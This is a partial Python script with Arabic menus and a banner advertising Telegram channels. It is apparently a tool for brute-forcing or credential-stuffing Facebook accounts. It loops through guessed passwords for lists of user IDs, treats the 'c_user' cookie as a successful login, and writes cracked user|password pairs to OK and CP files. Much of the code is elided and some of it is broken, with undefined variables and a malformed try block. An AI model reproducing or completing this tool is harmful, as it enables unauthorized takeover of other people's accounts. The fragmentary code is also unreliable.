...
g= datetime.datetime(2023, 7, 17, 2, 00 ,0)
...
\033[1;31m⠀⠀⣠⣶⡀⣿⣿⡇⢴⣿⣿⣿⣿⣿⣷⣦⠀⠀⠀⠀
\033[1;30m⠀⠀⢿⣿⣷⠘⣿⣿⣮⢉⣉⠛⣻⣿⣿⣿⠀⠀⠀⠀
\033[1;36m⠀⠀⠘⢿⣿⣦⡙⠛⠛⡼⣵⣿⣿⣿⣿⠃⠀⠀⠀ ⠀\033[1;32mF \033[1;31mG \033[1;33m_ \033[1;35mo \033[1;36mn
\033[1;33m⠀⠀⠀⠈⠛⢛⣴⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀ \033[1;32mP \033[1;31mY \033[1;33m_ \033[1;35m2 \033[1;36m3
\033[1;37m⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠿⠛⠁⠀⠀⠀⠀⠀


 \033[1;93m╔═════════════════[\033[1;32m 𝐃𝐄𝐍𝐈𝐑 \033[1;32m]══════════════╗
 \033[1;93m║     \033[1;96m[✓] تيلجرام \33[0;m   : \033[1;96m @PY_23  @FG_on  \033[1;32m║
 \033[1;93m║          \033[1;35m[✓] كل يومين تتحدث الاتصالات         :          \033[1;36m[✓] التحديث :  \033[1;36m0.2                  \033[1;32m             ║
 \033[1;93m║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱ \033[1;32m
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m لا تنسا الانضمام بالقنوات                 \033[1;32m  ║
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m @kkf1kk  @KRVIP0  @JJR2J @I_3_K       \033[1;32m 
 \033[1;93m╚═════════════════[\033[1;93m GOLDEN -  علش \033[1;32m]══════════════╝"""                                              

def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m شغال : \x1b[1;97m %s  \x1b[1;97mxc_f4_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m غير شغال :\x1b[1;97m   %s \x1b[1;97mxc_f4_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97m  للرجوع اضغط انتر ")
	    sarfraz()
...
def sarfraz():
    ...
    print(' \033[1;32m[1] الصيد ع ملف')
    
    print(' \033[1;31m[E] خروج ')
    print('')
    _sarfraz___ = input(' [?] اختار: ')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[\033[1;35m[انتضر يعمري] {loop}|{len(self.id)} ʚ OK ɞ[{len(ok)}] ʚ CP ɞ[{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        pass
                    print('\r%s ༺༽💔༼༻ %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('خطا💔_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            print('\033[1;33m عدد الايديات : %s ' % len(self.id))
            print('\033[1;32m صل ع محمد وأل محمد ')
            print(47*"-")
...
def manual():
    ...
    print('  Name: '+uname)
    print(50*'-')
    limit = int(input('  كم عدد الباسوردات ? '))
    save_file = input('  حفض في ملف...: ')
    t = 0
...
def auto():
    ...
    nusrat = []
    try:
        limit_user = int(input('  كم عدد الباسوردات ? '))
    except:
        limit_user = 1
    count = 0
    ...
    print(50*'-')
    try:
        ask_link = int(input('  كم عدد الباسوردات? '))
    except:
        ask_link = 1
    completed = 0
